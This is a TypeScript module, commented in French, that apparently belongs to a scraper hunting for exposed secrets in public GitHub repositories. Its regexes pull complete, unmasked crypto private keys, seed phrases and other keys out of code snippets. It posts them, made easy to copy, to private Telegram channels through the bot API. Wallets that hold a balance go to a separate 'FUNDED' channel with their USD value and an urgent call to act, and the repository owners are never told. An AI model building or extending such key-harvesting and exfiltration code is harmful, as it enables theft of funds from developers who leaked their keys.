/**
 * Telegram Notifier Service
 * Envoie des notifications dans un channel Telegram privé
 */

import { config } from '../config/index.js';
import { SecurityFinding } from '../types/index.js';
import logger from '../utils/logger.js';

interface TelegramConfig {
  botToken: string;
  chatIdAll: string;  // Channel pour tous les findings
  chatIdFunded: string;  // Channel pour les findings avec balance > 0
  enabled: boolean;
}

export class TelegramNotifier {
  private config: TelegramConfig;
  private apiUrl: string;

  constructor() {
    this.config = {
      botToken: process.env.TELEGRAM_BOT_TOKEN || '',
      chatIdAll: process.env.TELEGRAM_CHAT_ID_ALL || '-1003113285705',
      chatIdFunded: process.env.TELEGRAM_CHAT_ID_FUNDED || '-1002944547225',
      enabled: process.env.TELEGRAM_NOTIFICATIONS === 'true',
    };

    this.apiUrl = `https://api.telegram.org/bot${this.config.botToken}`;
  }

  /**
   * Envoie un message texte à Telegram
   */
  async sendMessage(text: string, chatId: string, options: any = {}): Promise<boolean> {
    if (!this.config.enabled || !this.config.botToken) {
      logger.debug('Telegram notifications disabled or not configured');
      return false;
    }

    try {
      const response = await fetch(`${this.apiUrl}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text,
          parse_mode: 'Markdown',
          disable_web_page_preview: true,
          ...options,
        }),
      });

      const data = await response.json();

      if (!data.ok) {
        throw new Error(`Telegram API error: ${data.description}`);
      }

      logger.info(`Telegram notification sent to ${chatId}`);
      return true;
    } catch (error: any) {
      logger.error('Failed to send Telegram notification:', error.message);
      return false;
    }
  }

  /**
   * Envoie vers le channel "tous les findings"
   */
  async sendToAllChannel(text: string): Promise<boolean> {
    return this.sendMessage(text, this.config.chatIdAll);
  }

  /**
   * Envoie vers le channel "findings avec balance"
   */
  async sendToFundedChannel(text: string): Promise<boolean> {
    return this.sendMessage(text, this.config.chatIdFunded);
  }

  /**
   * Formate et envoie une notification pour un nouveau finding
   * Envoie vers le channel ALL et vérifie la balance pour le channel FUNDED
   */
  async notifyFinding(finding: SecurityFinding, balanceInfo?: any): Promise<boolean> {
    const emoji = this.getSeverityEmoji(finding.severity);
    const message = this.formatFindingMessage(finding, emoji, balanceInfo);

    // Toujours envoyer vers le channel "ALL"
    const sentToAll = await this.sendToAllChannel(message);

    // Si balance > 0, envoyer aussi vers channel "FUNDED"
    if (balanceInfo && balanceInfo.hasBalance) {
      const fundedMessage = this.formatFundedFindingMessage(finding, balanceInfo);
      await this.sendToFundedChannel(fundedMessage);
    }

    return sentToAll;
  }

  /**
   * Formate et envoie une notification pour plusieurs findings
   */
  async notifyBulkFindings(findings: SecurityFinding[]): Promise<boolean> {
    if (findings.length === 0) return false;

    const message = this.formatBulkFindingsMessage(findings);
    return this.sendMessage(message);
  }

  /**
   * Envoie un résumé de scan
   */
  async notifyScanSummary(scanId: string, totalResults: number, findingsCount: number): Promise<boolean> {
    const message = `
🔍 *Scan Terminé*

📊 *Résumé*
\`\`\`
Scan ID    : ${scanId.substring(0, 8)}
Résultats  : ${totalResults}
Findings   : ${findingsCount}
Status     : Completed ✅
\`\`\`

💡 *Dashboard:* [Voir les détails](https://nykctocknzbstdqnfkun.supabase.co)
    `.trim();

    return this.sendToAllChannel(message);
  }

  /**
   * Envoie une alerte d'erreur
   */
  async notifyError(error: string, context?: string): Promise<boolean> {
    const message = `
🚨 *Erreur Scraper*

❌ *Message:* ${error}

${context ? `📝 *Context:* ${context}` : ''}

⏰ *Time:* ${new Date().toISOString()}
    `.trim();

    return this.sendToAllChannel(message);
  }

  /**
   * Test de connexion Telegram
   */
  async testConnection(): Promise<boolean> {
    const message = `
✅ *Test de Connexion*

Le scraper GitHub Security est correctement configuré !

📊 *Configuration:*
\`\`\`
Bot Token     : ${this.config.botToken ? '✓ Configuré' : '✗ Manquant'}
Channel ALL   : ${this.config.chatIdAll ? '✓ Configuré' : '✗ Manquant'}
Channel FUNDED: ${this.config.chatIdFunded ? '✓ Configuré' : '✗ Manquant'}
Status        : ${this.config.enabled ? '✓ Activé' : '✗ Désactivé'}
\`\`\`

📱 *2 Channels:*
• ALL (-1003113285705) : Tous les findings
• FUNDED (-1002944547225) : Balance > 0 uniquement

🚀 Le scraper est prêt à détecter les secrets exposés !
    `.trim();

    // Envoyer vers les 2 channels
    const sentAll = await this.sendToAllChannel(message);
    const sentFunded = await this.sendToFundedChannel(message);

    return sentAll && sentFunded;
  }

  /**
   * Formate un message pour un finding unique (CLÉS COMPLÈTES VISIBLES)
   */
  private formatFindingMessage(finding: SecurityFinding, emoji: string, balanceInfo?: any): string {
    const repoUrl = finding.repository_url;
    const fileUrl = finding.metadata?.file_url || repoUrl;
    
    // Extraire la clé complète du code snippet (pas de masquage)
    const fullKey = this.extractFullKey(finding.code_snippet, finding.matched_pattern);
    
    let message = `
${emoji} *${finding.severity.toUpperCase()} - ${finding.pattern_type}*

🔍 *Repository:* [${finding.repository_name}](${repoUrl})
📁 *File:* \`${finding.file_path || 'N/A'}\`
👤 *Owner:* @${finding.repository_owner}

🔑 *CLÉ COMPLÈTE (copiable):*
\`\`\`
${fullKey}
\`\`\`

⏰ *Discovered:* ${new Date(finding.discovered_at!).toLocaleString('fr-FR')}
`;

    // Ajouter info de balance si disponible
    if (balanceInfo && balanceInfo.hasBalance) {
      message += `
💰 *BALANCE DÉTECTÉE !*
💵 *Montant:* ${balanceInfo.balance} ${balanceInfo.currency}
💲 *USD:* $${balanceInfo.balanceUSD?.toFixed(2) || '0.00'}
⛓️ *Blockchain:* ${balanceInfo.blockchain}
`;
    }

    message += `\n🔗 [Voir le fichier](${fileUrl})`;

    return message.trim();
  }

  /**
   * Formate un message spécial pour le channel FUNDED (balance > 0)
   */
  private formatFundedFindingMessage(finding: SecurityFinding, balanceInfo: any): string {
    const fullKey = this.extractFullKey(finding.code_snippet, finding.matched_pattern);
    
    return `
🚨 *ALERTE CRITIQUE - FONDS DÉTECTÉS !* 🚨

💰 *Balance:* ${balanceInfo.balance} ${balanceInfo.currency} (${this.formatUSD(balanceInfo.balanceUSD)})
⛓️ *Blockchain:* ${balanceInfo.blockchain}

🔍 *Repository:* [${finding.repository_name}](${finding.repository_url})
📁 *File:* \`${finding.file_path}\`
👤 *Owner:* @${finding.repository_owner}

🔑 *CLÉ/ADRESSE COMPLÈTE:*
\`\`\`
${fullKey}
\`\`\`

📋 *Type:* ${finding.pattern_type}
⚠️ *Severity:* ${finding.severity.toUpperCase()}

⏰ *Découvert:* ${new Date(finding.discovered_at!).toLocaleString('fr-FR')}

🔗 [Voir le repo](${finding.repository_url})

⚡ *ACTION URGENTE REQUISE !*
    `.trim();
  }

  /**
   * Extrait la clé complète sans masquage
   */
  private extractFullKey(codeSnippet: string, matchedPattern: string): string {
    // Chercher des patterns de clés dans le snippet
    const patterns = [
      // Ethereum/EVM private keys
      /(?:PRIVATE_KEY|WALLET_KEY|SECRET_KEY|ETH_PRIVATE_KEY)[=:\s]*["']?([a-fA-F0-9]{64}|0x[a-fA-F0-9]{64})["']?/i,
      // Ethereum addresses
      /(0x[a-fA-F0-9]{40})/,
      // Bitcoin addresses
      /([13][a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-z0-9]{39,87})/,
      // Solana addresses/keys
      /([1-9A-HJ-NP-Za-km-z]{43,88})/,
      // Mnemonics
      /["']([a-z]+\s+){11,23}[a-z]+["']/i,
      // Generic keys
      /["']([a-zA-Z0-9+/=_-]{40,})["']/,
    ];

    for (const pattern of patterns) {
      const match = codeSnippet.match(pattern);
      if (match) {
        return match[1] || match[0];
      }
    }

    // Si aucun pattern ne match, retourner le snippet complet
    return codeSnippet.trim();
  }

  /**
   * Formate le montant en USD
   */
  private formatUSD(amount: number): string {
    return new Intl.NumberFormat('en-US', {
      style: 'currency',
      currency: 'USD',
    }).format(amount);
  }

  /**
   * Formate un message pour plusieurs findings
   */
  private formatBulkFindingsMessage(findings: SecurityFinding[]): string {
    const critical = findings.filter(f => f.severity === 'critical').length;
    const high = findings.filter(f => f.severity === 'high').length;
    const medium = findings.filter(f => f.severity === 'medium').length;

    let message = `
🚨 *${findings.length} Nouveaux Findings Détectés !*

📊 *Par Sévérité:*
\`\`\`
🔴 Critical : ${critical}
🟠 High     : ${high}
🟡 Medium   : ${medium}
\`\`\`

🔍 *Top 5:*
`;

    // Ajouter les 5 premiers findings
    findings.slice(0, 5).forEach((finding, i) => {
      const emoji = this.getSeverityEmoji(finding.severity);
      message += `
${i + 1}. ${emoji} \`${finding.pattern_type}\` - [${finding.repository_name}](${finding.repository_url})`;
    });

    if (findings.length > 5) {
      message += `\n\n... et ${findings.length - 5} autres`;
    }

    message += '\n\n💡 [Voir le dashboard](https://nykctocknzbstdqnfkun.supabase.co)';

    return message.trim();
  }

  /**
   * Retourne l'emoji correspondant à la sévérité
   */
  private getSeverityEmoji(severity: string): string {
    const emojis: Record<string, string> = {
      critical: '🔴',
      high: '🟠',
      medium: '🟡',
      low: '🔵',
    };
    return emojis[severity] || '⚪';
  }

  /**
   * Vérifie si les notifications Telegram sont configurées
   */
  isConfigured(): boolean {
    return Boolean(
      this.config.enabled &&
      this.config.botToken &&
      (this.config.chatIdAll || this.config.chatIdFunded)
    );
  }
}

export default new TelegramNotifier();
